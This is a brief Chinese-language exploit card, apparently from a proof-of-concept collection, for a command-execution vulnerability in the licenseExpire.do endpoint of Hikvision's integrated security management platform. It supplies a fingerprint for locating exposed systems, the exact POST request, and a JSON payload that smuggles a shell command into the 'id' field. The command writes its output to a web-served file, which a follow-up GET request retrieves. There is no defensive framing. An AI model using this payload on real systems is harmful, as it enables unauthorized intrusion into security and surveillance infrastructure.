# 海康威视综合安防管理平台licenseExpire.do存在命令执行漏洞

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`header ="portal/cas/loginPage"`
- **请求**：`POST /portal/cas/login/ajax/licenseExpire.do HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`Content-Length: 155`

**请求体 / payload**
```
{"type":"environment","operate":"","machines":{"id":"$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}}
GET /vms/static/1.txt HTTP/1.1
Host:
```
- **预期**：200　|　—